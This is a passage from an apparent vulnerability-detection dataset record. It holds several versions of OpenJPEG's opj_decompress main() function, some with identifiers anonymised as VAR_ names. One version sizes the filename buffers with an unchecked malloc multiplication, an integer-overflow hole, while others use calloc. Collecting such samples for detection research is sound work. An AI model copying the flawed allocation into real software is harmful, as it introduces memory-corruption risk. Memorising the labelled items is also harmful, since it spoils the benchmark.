opj_destroy_cstr_index(&cstr_index);
if (failed) {
(void)remove(parameters.outfile);    
}
}
fin:
destroy_parameters(&parameters);
if (failed && img_fol.imgdirpath) {
free(img_fol.imgdirpath);
}
if (dirptr) {
if (dirptr->filename) {
free(dirptr->filename);
}
if (dirptr->filename_buf) {
free(dirptr->filename_buf);
}
free(dirptr);
}
if (numDecompressedImages && !failed && !(parameters.quiet)) {
fprintf(stdout, ""decode time: %d ms\n"",
(int)((tCumulative * 1000.0) / (OPJ_FLOAT64)numDecompressedImages));
}
return failed ? EXIT_FAILURE : EXIT_SUCCESS;
}","int main(int VAR_0, char **VAR_1)
{
opj_decompress_parameters VAR_2;           
OPJ_INT32 VAR_3, VAR_4;
img_fol_t VAR_5;
dircnt_t *VAR_6 = NULL;
int VAR_7 = 0;
OPJ_FLOAT64 VAR_8, VAR_9 = 0;
OPJ_UINT32 VAR_10 = 0;
OPJ_UINT32 VAR_11;
set_default_parameters(&VAR_2);
memset(&VAR_5, 0, sizeof(img_fol_t));
if (parse_cmdline_decoder(VAR_0, VAR_1, &VAR_2, &VAR_5) == 1) {
VAR_7 = 1;
goto fin;
}
VAR_11 = VAR_2.core.cp_reduce;
if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
VAR_2.core.cp_reduce = 0;
}
if (VAR_5.set_imgdir == 1) {
int VAR_12;
VAR_3 = get_num_images(VAR_5.imgdirpath);
VAR_6 = (dircnt_t*)calloc(1, sizeof(dircnt_t));
if (!VAR_6) {
destroy_parameters(&VAR_2);
return VAR_13;
}
VAR_6->filename_buf = (char*)malloc(sizeof(char) *
(size_t)VAR_3 * VAR_14);
if (!VAR_6->filename_buf) {
VAR_7 = 1;
goto fin;
}
VAR_6->filename = (char**) malloc((size_t)VAR_3 * sizeof(char*));
if (!VAR_6->filename) {
VAR_7 = 1;
goto fin;
}
for (VAR_12 = 0; VAR_12 < VAR_3; VAR_12++) {
VAR_6->filename[VAR_12] = VAR_6->filename_buf + VAR_12 * VAR_14;
}
if (load_images(VAR_6, VAR_5.imgdirpath) == 1) {
VAR_7 = 1;
goto fin;
}
if (VAR_3 == 0) {
fprintf(VAR_15, ""Folder is empty\n"");
VAR_7 = 1;
goto fin;
}
} else {
VAR_3 = 1;
}
for (VAR_4 = 0; VAR_4 < VAR_3 ; VAR_4++)  {
opj_image_t* VAR_16 = NULL;
opj_stream_t *VAR_17 = NULL;              
opj_codec_t* VAR_18 = NULL;                
opj_codestream_index_t* VAR_19 = NULL;
if (!VAR_2.quiet) {
fprintf(VAR_15, ""\n"");
}
if (VAR_5.set_imgdir == 1) {
if (get_next_file(VAR_4, VAR_6, &VAR_5, &VAR_2)) {
fprintf(VAR_15, ""skipping file...\n"");
destroy_parameters(&VAR_2);
continue;
}
}
VAR_17 = opj_stream_create_default_file_stream(VAR_2.infile, 1);
if (!VAR_17) {
fprintf(VAR_15, ""ERROR -> failed to create the stream from the file %s\n"",
VAR_2.infile);
VAR_7 = 1;
goto fin;
}
switch (VAR_2.decod_format) {
case VAR_20: { 
VAR_18 = opj_create_decompress(VAR_21);
break;
}
case VAR_22: { 
VAR_18 = opj_create_decompress(VAR_23);
break;
}
case VAR_24: { 
VAR_18 = opj_create_decompress(VAR_25);
break;
}
default:
fprintf(VAR_15, ""skipping file..\n"");
destroy_parameters(&VAR_2);
opj_stream_destroy(VAR_17);
continue;
}
if (VAR_2.quiet) {
opj_set_info_handler(VAR_18, VAR_26, 00);
opj_set_warning_handler(VAR_18, VAR_26, 00);
opj_set_error_handler(VAR_18, VAR_26, 00);
} else {
opj_set_info_handler(VAR_18, VAR_27, 00);
opj_set_warning_handler(VAR_18, VAR_28, 00);
opj_set_error_handler(VAR_18, VAR_29, 00);
}
VAR_8 = opj_clock();
if (!opj_setup_decoder(VAR_18, &(VAR_2.core))) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to setup the decoder\n"");
opj_stream_destroy(VAR_17);
opj_destroy_codec(VAR_18);
VAR_7 = 1;
goto fin;
}
if (VAR_2.num_threads >= 1 &&
!opj_codec_set_threads(VAR_18, VAR_2.num_threads)) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to set number of threads\n"");
opj_stream_destroy(VAR_17);
opj_destroy_codec(VAR_18);
VAR_7 = 1;
goto fin;
}
if (! opj_read_header(VAR_17, VAR_18, &VAR_16)) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to read the header\n"");
opj_stream_destroy(VAR_17);
opj_destroy_codec(VAR_18);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
if (VAR_2.numcomps) {
if (! opj_set_decoded_components(VAR_18,
VAR_2.numcomps,
VAR_2.comps_indices,
VAR_30)) {
fprintf(VAR_15,
""ERROR -> opj_decompress: failed to set the component indices!\n"");
opj_destroy_codec(VAR_18);
opj_stream_destroy(VAR_17);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
}
if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
if (! opj_set_decoded_resolution_factor(VAR_18, VAR_11)) {
fprintf(VAR_15,
""ERROR -> opj_decompress: failed to set the resolution factor tile!\n"");
opj_destroy_codec(VAR_18);
opj_stream_destroy(VAR_17);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
}
if (!VAR_2.nb_tile_to_decode) {
if (getenv(""SKIP_OPJ_SET_DECODE_AREA"") != NULL &&
VAR_2.DA_x0 == 0 &&
VAR_2.DA_y0 == 0 &&
VAR_2.DA_x1 == 0 &&
VAR_2.DA_y1 == 0) {
}
else if (!opj_set_decode_area(VAR_18, VAR_16, (OPJ_INT32)VAR_2.DA_x0,
(OPJ_INT32)VAR_2.DA_y0, (OPJ_INT32)VAR_2.DA_x1,
(OPJ_INT32)VAR_2.DA_y1)) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to set the decoded area\n"");
opj_stream_destroy(VAR_17);
opj_destroy_codec(VAR_18);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
if (!(opj_decode(VAR_18, VAR_17, VAR_16) &&
opj_end_decompress(VAR_18,   VAR_17))) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to decode image!\n"");
opj_destroy_codec(VAR_18);
opj_stream_destroy(VAR_17);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
} else {
if (!(VAR_2.DA_x0 == 0 &&
VAR_2.DA_y0 == 0 &&
VAR_2.DA_x1 == 0 &&
VAR_2.DA_y1 == 0)) {
if (!(VAR_2.quiet)) {
fprintf(VAR_15, ""WARNING: -d option ignored when used together with -t\n"");
}
}
if (!opj_get_decoded_tile(VAR_18, VAR_17, VAR_16, VAR_2.tile_index)) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to decode tile!\n"");
opj_destroy_codec(VAR_18);
opj_stream_destroy(VAR_17);
opj_image_destroy(VAR_16);
VAR_7 = 1;
goto fin;
}
if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""tile %d is decoded!\n\n"", VAR_2.tile_index);
}
}
VAR_9 += opj_clock() - VAR_8;
VAR_10++;
opj_stream_destroy(VAR_17);
if (VAR_16->color_space != VAR_32
&& VAR_16->numcomps == 3 && VAR_16->comps[0].dx == VAR_16->comps[0].dy
&& VAR_16->comps[1].dx != 1) {
VAR_16->color_space = VAR_32;
} else if (VAR_16->numcomps <= 2) {
VAR_16->color_space = VAR_33;
}
if (VAR_16->color_space == VAR_32) {
color_sycc_to_rgb(VAR_16);
} else if ((VAR_16->color_space == VAR_34) &&
(VAR_2.cod_format != VAR_35)) {
color_cmyk_to_rgb(VAR_16);
} else if (VAR_16->color_space == VAR_36) {
color_esycc_to_rgb(VAR_16);
}
if (VAR_16->icc_profile_buf) {
#if defined(VAR_37) || defined(VAR_38)
if (VAR_16->icc_profile_len) {
color_apply_icc_profile(VAR_16);
} else {
color_cielab_to_rgb(VAR_16);
}
#endif
free(VAR_16->icc_profile_buf);
VAR_16->icc_profile_buf = NULL;
VAR_16->icc_profile_len = 0;
}
if (VAR_2.precision != NULL) {
OPJ_UINT32 VAR_39;
for (VAR_39 = 0; VAR_39 < VAR_16->numcomps; ++VAR_39) {
OPJ_UINT32 VAR_40 = VAR_39;
OPJ_UINT32 VAR_41;
if (VAR_40 >= VAR_2.nb_precision) {
VAR_40 = VAR_2.nb_precision - 1U;
}
VAR_41 = VAR_2.precision[VAR_40].prec;
if (VAR_41 == 0) {
VAR_41 = VAR_16->comps[VAR_39].prec;
}
switch (VAR_2.precision[VAR_40].mode) {
case VAR_42:
clip_component(&(VAR_16->comps[VAR_39]), VAR_41);
break;
case VAR_43:
scale_component(&(VAR_16->comps[VAR_39]), VAR_41);
break;
default:
break;
}
}
}
if (VAR_2.upsample) {
VAR_16 = upsample_image_components(VAR_16);
if (VAR_16 == NULL) {
fprintf(VAR_15,
""ERROR -> opj_decompress: failed to upsample image components!\n"");
opj_destroy_codec(VAR_18);
VAR_7 = 1;
goto fin;
}
}
if (VAR_2.force_rgb) {
switch (VAR_16->color_space) {
case VAR_44:
break;
case VAR_33:
VAR_16 = convert_gray_to_rgb(VAR_16);
break;
default:
fprintf(VAR_15,
""ERROR -> opj_decompress: don't know how to convert image to RGB colorspace!\n"");
opj_image_destroy(VAR_16);
VAR_16 = NULL;
break;
}
if (VAR_16 == NULL) {
fprintf(VAR_15, ""ERROR -> opj_decompress: failed to convert to RGB image!\n"");
opj_destroy_codec(VAR_18);
VAR_7 = 1;
goto fin;
}
}
switch (VAR_2.cod_format) {
case VAR_45:          
if (imagetopnm(VAR_16, VAR_2.outfile, VAR_2.split_pnm)) {
fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
case VAR_46:          
if (imagetopgx(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
case VAR_47:          
if (imagetobmp(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
#ifdef VAR_48
case VAR_35:          
if (imagetotif(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
#endif 
case VAR_49:          
if (imagetoraw(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15,
""[ERROR] Error generating raw or yuv file. Outfile %s not generated\n"",
VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
case VAR_50:         
if (imagetorawl(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15,
""[ERROR] Error generating rawl file. Outfile %s not generated\n"",
VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
case VAR_51:          
if (imagetotga(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15, ""[ERROR] Error generating tga file. Outfile %s not generated\n"",
VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
#ifdef VAR_52
case VAR_53:          
if (imagetopng(VAR_16, VAR_2.outfile)) {
fprintf(VAR_15, ""[ERROR] Error generating png file. Outfile %s not generated\n"",
VAR_2.outfile);
VAR_7 = 1;
} else if (!(VAR_2.quiet)) {
fprintf(VAR_31, ""[INFO] Generated Outfile %s\n"", VAR_2.outfile);
}
break;
#endif 
default:
fprintf(VAR_15, ""[ERROR] Outfile %s not generated\n"", VAR_2.outfile);
VAR_7 = 1;
}
if (VAR_18) {
opj_destroy_codec(VAR_18);
}
opj_image_destroy(VAR_16);
opj_destroy_cstr_index(&VAR_19);
if (VAR_7) {
(void)remove(VAR_2.outfile);    
}
}
fin:
destroy_parameters(&VAR_2);
if (VAR_7 && VAR_5.imgdirpath) {
free(VAR_5.imgdirpath);
}
if (VAR_6) {
if (VAR_6->filename) {
free(VAR_6->filename);
}
if (VAR_6->filename_buf) {
free(VAR_6->filename_buf);
}
free(VAR_6);
}
if (VAR_10 && !VAR_7 && !(VAR_2.quiet)) {
fprintf(VAR_31, ""decode time: %d ms\n"",
(int)((VAR_9 * 1000.0) / (OPJ_FLOAT64)VAR_10));
}
return VAR_7 ? VAR_13 : VAR_54;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_decompress.c/vul/before/0.json,"int main(int argc, char **argv)
{
    opj_decompress_parameters parameters;           /* decompression parameters */

    OPJ_INT32 num_images, imageno;
    img_fol_t img_fol;
    dircnt_t *dirptr = NULL;
    int failed = 0;
    OPJ_FLOAT64 t, tCumulative = 0;
    OPJ_UINT32 numDecompressedImages = 0;
    OPJ_UINT32 cp_reduce;

    /* set decoding parameters to default values */
    set_default_parameters(&parameters);

    /* Initialize img_fol */
    memset(&img_fol, 0, sizeof(img_fol_t));

    /* parse input and get user encoding parameters */
    if (parse_cmdline_decoder(argc, argv, &parameters, &img_fol) == 1) {
        failed = 1;
        goto fin;
    }

    cp_reduce = parameters.core.cp_reduce;
    if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
        /* For debugging/testing purposes, do not set the cp_reduce member */
        /* if USE_OPJ_SET_DECODED_RESOLUTION_FACTOR is defined, but used */
        /* the opj_set_decoded_resolution_factor() API instead */
        parameters.core.cp_reduce = 0;
    }


    /* Initialize reading of directory */
    if (img_fol.set_imgdir == 1) {
        int it_image;
        num_images = get_num_images(img_fol.imgdirpath);

        dirptr = (dircnt_t*)calloc(1, sizeof(dircnt_t));
        if (!dirptr) {
            destroy_parameters(&parameters);
            return EXIT_FAILURE;
        }
        /* Stores at max 10 image file names */
        dirptr->filename_buf = calloc((size_t) num_images, sizeof(char) * OPJ_PATH_LEN);
        if (!dirptr->filename_buf) {
            failed = 1;
            goto fin;
        }

        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));

        if (!dirptr->filename) {
            failed = 1;
            goto fin;
        }
        for (it_image = 0; it_image < num_images; it_image++) {
            dirptr->filename[it_image] = dirptr->filename_buf + it_image * OPJ_PATH_LEN;
        }

        if (load_images(dirptr, img_fol.imgdirpath) == 1) {
            failed = 1;
            goto fin;
        }
        if (num_images == 0) {
            fprintf(stderr, ""Folder is empty\n"");
            failed = 1;
            goto fin;
        }
    } else {
        num_images = 1;
    }

    /*Decoding image one by one*/
    for (imageno = 0; imageno < num_images ; imageno++)  {
        opj_image_t* image = NULL;
        opj_stream_t *l_stream = NULL;              /* Stream */
        opj_codec_t* l_codec = NULL;                /* Handle to a decompressor */
        opj_codestream_index_t* cstr_index = NULL;

        if (!parameters.quiet) {
            fprintf(stderr, ""\n"");
        }

        if (img_fol.set_imgdir == 1) {
            if (get_next_file(imageno, dirptr, &img_fol, &parameters)) {
                fprintf(stderr, ""skipping file...\n"");
                destroy_parameters(&parameters);
                continue;
            }
        }

        /* read the input file and put it in memory */
        /* ---------------------------------------- */

        l_stream = opj_stream_create_default_file_stream(parameters.infile, 1);
        if (!l_stream) {
            fprintf(stderr, ""ERROR -> failed to create the stream from the file %s\n"",
                    parameters.infile);
            failed = 1;
            goto fin;
        }

        /* decode the JPEG2000 stream */
        /* ---------------------- */

        switch (parameters.decod_format) {
        case J2K_CFMT: { /* JPEG-2000 codestream */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_J2K);
            break;
        }
        case JP2_CFMT: { /* JPEG 2000 compressed image data */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_JP2);
            break;
        }
        case JPT_CFMT: { /* JPEG 2000, JPIP */
            /* Get a decoder handle */
            l_codec = opj_create_decompress(OPJ_CODEC_JPT);
            break;
        }
        default:
            fprintf(stderr, ""skipping file..\n"");
            destroy_parameters(&parameters);
            opj_stream_destroy(l_stream);
            continue;
        }

        if (parameters.quiet) {
            /* Set all callbacks to quiet */
            opj_set_info_handler(l_codec, quiet_callback, 00);
            opj_set_warning_handler(l_codec, quiet_callback, 00);
            opj_set_error_handler(l_codec, quiet_callback, 00);
        } else {
            /* catch events using our callbacks and give a local context */
            opj_set_info_handler(l_codec, info_callback, 00);
            opj_set_warning_handler(l_codec, warning_callback, 00);
            opj_set_error_handler(l_codec, error_callback, 00);
        }


        t = opj_clock();

        /* Setup the decoder decoding parameters using user parameters */
        if (!opj_setup_decoder(l_codec, &(parameters.core))) {
            fprintf(stderr, ""ERROR -> opj_decompress: failed to setup the decoder\n"");
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            failed = 1;
            goto fin;
        }

        if (parameters.num_threads >= 1 &&
                !opj_codec_set_threads(l_codec, parameters.num_threads)) {
            fprintf(stderr, ""ERROR -> opj_decompress: failed to set number of threads\n"");
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            failed = 1;
            goto fin;
        }

        /* Read the main header of the codestream and if necessary the JP2 boxes*/
        if (! opj_read_header(l_stream, l_codec, &image)) {
            fprintf(stderr, ""ERROR -> opj_decompress: failed to read the header\n"");
            opj_stream_destroy(l_stream);
            opj_destroy_codec(l_codec);
            opj_image_destroy(image);
            failed = 1;
            goto fin;
        }

        if (parameters.numcomps) {
            if (! opj_set_decoded_components(l_codec,
                                             parameters.numcomps,
                                             parameters.comps_indices,
                                             OPJ_FALSE)) {
                fprintf(stderr,
                        ""ERROR -> opj_decompress: failed to set the component indices!\n"");
                opj_destroy_codec(l_codec);
                opj_stream_destroy(l_stream);
                opj_image_destroy(image);
                failed = 1;
                goto fin;
            }
        }

        if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
            /* For debugging/testing purposes, and also an illustration on how to */
            /* use the alternative API opj_set_decoded_resolution_factor() instead */
            /* of setting parameters.cp_reduce */
            if (! opj_set_decoded_resolution_factor(l_codec, cp_reduce)) {
                fprintf(stderr,
                        ""ERROR -> opj_decompress: failed to set the resolution factor tile!\n"");
                opj_destroy_codec(l_codec);
                opj_stream_destroy(l_stream);
                opj_image_destroy(image);
                failed = 1;
                goto fin;
            }
        }

        if (!parameters.nb_tile_to_decode) {
            if (getenv(""SKIP_OPJ_SET_DECODE_AREA"") != NULL &&
                    parameters.DA_x0 == 0 &&
                    parameters.DA_y0 == 0 &&
                    parameters.DA_x1 == 0 &&
                    parameters.DA_y1 == 0) {
                /* For debugging/testing purposes, */
                /* do nothing if SKIP_OPJ_SET_DECODE_AREA env variable */
                /* is defined and no decoded area has been set */
            }
            /* Optional if you want decode the entire image */
            else if (!opj_set_decode_area(l_codec, image, (OPJ_INT32)parameters.DA_x0,
                                          (OPJ_INT32)parameters.DA_y0, (OPJ_INT32)parameters.DA_x1,
                                          (OPJ_INT32)parameters.DA_y1)) {
                fprintf(stderr, ""ERROR -> opj_decompress: failed to set the decoded area\n"");
                opj_stream_destroy(l_stream);
                opj_destroy_codec(l_codec);
                opj_image_destroy(image);
                failed = 1;
                goto fin;
            }

            /* Get the decoded image */
            if (!(opj_decode(l_codec, l_stream, image) &&
                    opj_end_decompress(l_codec,   l_stream))) {
                fprintf(stderr, ""ERROR -> opj_decompress: failed to decode image!\n"");
                opj_destroy_codec(l_codec);
                opj_stream_destroy(l_stream);
                opj_image_destroy(image);
                failed = 1;
                goto fin;
            }
        } else {
            if (!(parameters.DA_x0 == 0 &&
                    parameters.DA_y0 == 0 &&
                    parameters.DA_x1 == 0 &&
                    parameters.DA_y1 == 0)) {
                if (!(parameters.quiet)) {
                    fprintf(stderr, ""WARNING: -d option ignored when used together with -t\n"");
                }
            }

            if (!opj_get_decoded_tile(l_codec, l_stream, image, parameters.tile_index)) {
                fprintf(stderr, ""ERROR -> opj_decompress: failed to decode tile!\n"");
                opj_destroy_codec(l_codec);
                opj_stream_destroy(l_stream);
                opj_image_destroy(image);
                failed = 1;
                goto fin;
            }
            if (!(parameters.quiet)) {
                fprintf(stdout, ""tile %d is decoded!\n\n"", parameters.tile_index);
            }
        }

        tCumulative += opj_clock() - t;
        numDecompressedImages++;

        /* Close the byte stream */
        opj_stream_destroy(l_stream);

        if (image->color_space != OPJ_CLRSPC_SYCC
                && image->numcomps == 3 && image->comps[0].dx == image->comps[0].dy
                && image->comps[1].dx != 1) {
            image->color_space = OPJ_CLRSPC_SYCC;
        } else if (image->numcomps <= 2) {
            image->color_space = OPJ_CLRSPC_GRAY;
        }

        if (image->color_space == OPJ_CLRSPC_SYCC) {
            color_sycc_to_rgb(image);
        } else if ((image->color_space == OPJ_CLRSPC_CMYK) &&
                   (parameters.cod_format != TIF_DFMT)) {
            color_cmyk_to_rgb(image);
        } else if (image->color_space == OPJ_CLRSPC_EYCC) {
            color_esycc_to_rgb(image);
        }

        if (image->icc_profile_buf) {
#if defined(OPJ_HAVE_LIBLCMS1) || defined(OPJ_HAVE_LIBLCMS2)
            if (image->icc_profile_len) {
                color_apply_icc_profile(image);
            } else {
                color_cielab_to_rgb(image);
            }
#endif
            free(image->icc_profile_buf);
            image->icc_profile_buf = NULL;
            image->icc_profile_len = 0;
        }

        /* Force output precision */
        /* ---------------------- */
        if (parameters.precision != NULL) {
            OPJ_UINT32 compno;
            for (compno = 0; compno < image->numcomps; ++compno) {
                OPJ_UINT32 precno = compno;
                OPJ_UINT32 prec;

                if (precno >= parameters.nb_precision) {
                    precno = parameters.nb_precision - 1U;
                }

                prec = parameters.precision[precno].prec;
                if (prec == 0) {
                    prec = image->comps[compno].prec;
                }

                switch (parameters.precision[precno].mode) {
                case OPJ_PREC_MODE_CLIP:
                    clip_component(&(image->comps[compno]), prec);
                    break;
                case OPJ_PREC_MODE_SCALE:
                    scale_component(&(image->comps[compno]), prec);
                    break;
                default:
                    break;
                }

            }
        }

        /* Upsample components */
        /* ------------------- */
        if (parameters.upsample) {
            image = upsample_image_components(image);
            if (image == NULL) {
                fprintf(stderr,
                        ""ERROR -> opj_decompress: failed to upsample image components!\n"");
                opj_destroy_codec(l_codec);
                failed = 1;
                goto fin;
            }
        }

        /* Force RGB output */
        /* ---------------- */
        if (parameters.force_rgb) {
            switch (image->color_space) {
            case OPJ_CLRSPC_SRGB:
                break;
            case OPJ_CLRSPC_GRAY:
                image = convert_gray_to_rgb(image);
                break;
            default:
                fprintf(stderr,
                        ""ERROR -> opj_decompress: don't know how to convert image to RGB colorspace!\n"");
                opj_image_destroy(image);
                image = NULL;
                break;
            }
            if (image == NULL) {
                fprintf(stderr, ""ERROR -> opj_decompress: failed to convert to RGB image!\n"");
                opj_destroy_codec(l_codec);
                failed = 1;
                goto fin;
            }
        }

        /* create output image */
        /* ------------------- */
        switch (parameters.cod_format) {
        case PXM_DFMT:          /* PNM PGM PPM */
            if (imagetopnm(image, parameters.outfile, parameters.split_pnm)) {
                fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;

        case PGX_DFMT:          /* PGX */
            if (imagetopgx(image, parameters.outfile)) {
                fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;

        case BMP_DFMT:          /* BMP */
            if (imagetobmp(image, parameters.outfile)) {
                fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;
#ifdef OPJ_HAVE_LIBTIFF
        case TIF_DFMT:          /* TIF(F) */
            if (imagetotif(image, parameters.outfile)) {
                fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;
#endif /* OPJ_HAVE_LIBTIFF */
        case RAW_DFMT:          /* RAW */
            if (imagetoraw(image, parameters.outfile)) {
                fprintf(stderr,
                        ""[ERROR] Error generating raw or yuv file. Outfile %s not generated\n"",
                        parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;

        case RAWL_DFMT:         /* RAWL */
            if (imagetorawl(image, parameters.outfile)) {
                fprintf(stderr,
                        ""[ERROR] Error generating rawl file. Outfile %s not generated\n"",
                        parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;

        case TGA_DFMT:          /* TGA */
            if (imagetotga(image, parameters.outfile)) {
                fprintf(stderr, ""[ERROR] Error generating tga file. Outfile %s not generated\n"",
                        parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;
#ifdef OPJ_HAVE_LIBPNG
        case PNG_DFMT:          /* PNG */
            if (imagetopng(image, parameters.outfile)) {
                fprintf(stderr, ""[ERROR] Error generating png file. Outfile %s not generated\n"",
                        parameters.outfile);
                failed = 1;
            } else if (!(parameters.quiet)) {
                fprintf(stdout, ""[INFO] Generated Outfile %s\n"", parameters.outfile);
            }
            break;
#endif /* OPJ_HAVE_LIBPNG */
        /* Can happen if output file is TIF(F) or PNG
         * and OPJ_HAVE_LIBTIF or OPJ_HAVE_LIBPNG is undefined
        */
        default:
            fprintf(stderr, ""[ERROR] Outfile %s not generated\n"", parameters.outfile);
            failed = 1;
        }

        /* free remaining structures */
        if (l_codec) {
            opj_destroy_codec(l_codec);
        }


        /* free image data structure */
        opj_image_destroy(image);

        /* destroy the codestream index */
        opj_destroy_cstr_index(&cstr_index);

        if (failed) {
            (void)remove(parameters.outfile);    /* ignore return value */
        }
    }
fin:
    destroy_parameters(&parameters);
    if (failed && img_fol.imgdirpath) {
        free(img_fol.imgdirpath);
    }
    if (dirptr) {
        if (dirptr->filename) {
            free(dirptr->filename);
        }
        if (dirptr->filename_buf) {
            free(dirptr->filename_buf);
        }
        free(dirptr);
    }
    if (numDecompressedImages && !failed && !(parameters.quiet)) {
        fprintf(stdout, ""decode time: %d ms\n"",
                (int)((tCumulative * 1000.0) / (OPJ_FLOAT64)numDecompressedImages));
    }
    return failed ? EXIT_FAILURE : EXIT_SUCCESS;
}","int main(int VAR_0, char **VAR_1)
{
    opj_decompress_parameters VAR_2;           /* COMMENT_0 */

    OPJ_INT32 VAR_3, VAR_4;
    img_fol_t VAR_5;
    dircnt_t *VAR_6 = NULL;
    int VAR_7 = 0;
    OPJ_FLOAT64 VAR_8, VAR_9 = 0;
    OPJ_UINT32 VAR_10 = 0;
    OPJ_UINT32 VAR_11;

    /* COMMENT_1 */
    set_default_parameters(&VAR_2);

    /* COMMENT_2 */
    memset(&VAR_5, 0, sizeof(img_fol_t));

    /* COMMENT_3 */
    if (parse_cmdline_decoder(VAR_0, VAR_1, &VAR_2, &VAR_5) == 1) {
        VAR_7 = 1;
        goto fin;
    }

    VAR_11 = VAR_2.core.cp_reduce;
    if (getenv(""USE_OPJ_SET_DECODED_RESOLUTION_FACTOR"") != NULL) {
        /* COMMENT_4 */
        /* COMMENT_5 */
        /* COMMENT_6 */
        VAR_2.core.cp_reduce = 0;
    }


    /* COMMENT_7 */
    if (VAR_5.set_imgdir == 1) {
        int VAR_12;
        VAR_3 = get_num_images(VAR_5.imgdirpath);

        VAR_6 = (dircnt_t*)calloc(1, sizeof(dircnt_t));
        if (!VAR_6) {
            destroy_parameters(&VAR_2);
            return VAR_13;
        }
        /* COMMENT_8 */
        VAR_6->filename_buf = calloc((size_t) VAR_3, sizeof(char) * VAR_14);
        if (!VAR_6->filename_buf) {
            VAR_7 = 1;
            goto fin;
        }

        VAR_6->filename = (char**) calloc((size_t) VAR_3, sizeof(char*));

        if (!VAR_6->filename) {
            VAR_7 = 1;
            goto fin;
        }
        for (VAR_12 = 0; VAR_12 < VAR_3; VAR_12++) {
            VAR_6->filename[VAR_12] = VAR_6->filename_buf + VAR_12 * VAR_14;
        }

        if (load_images(VAR_6, VAR_5.imgdirpath) == 1) {
            VAR_7 = 1;
            goto fin;
        }
        if (VAR_3 == 0) {
            fprintf(VAR_15, ""Folder is empty\n"");
            VAR_7 = 1;
            goto fin;
        }
    } else {
        VAR_3 = 1;
    }

    /* COMMENT_9 */
    for (VAR_4 = 0; VAR_4 < VAR_3 ; VAR_4++)  {
        opj_image_t* VAR_16 = NULL;
        opj_stream_t *VAR_17 = NULL;              /* COMMENT_10 */
        opj_codec_t* VAR_18 = NULL;                /* COMMENT_11 */
        opj_codestream_index_t* VAR_19 = NULL;

        if (!VAR_2.quiet) {
            fprintf(VAR_15, ""\n"");
        }

        if (VAR_5.set_imgdir == 1) {
            if (get_next_file(VAR_4, VAR_6, &VAR_5, &VAR_2)) {
                fprintf(VAR_15, ""skipping file...\n"");
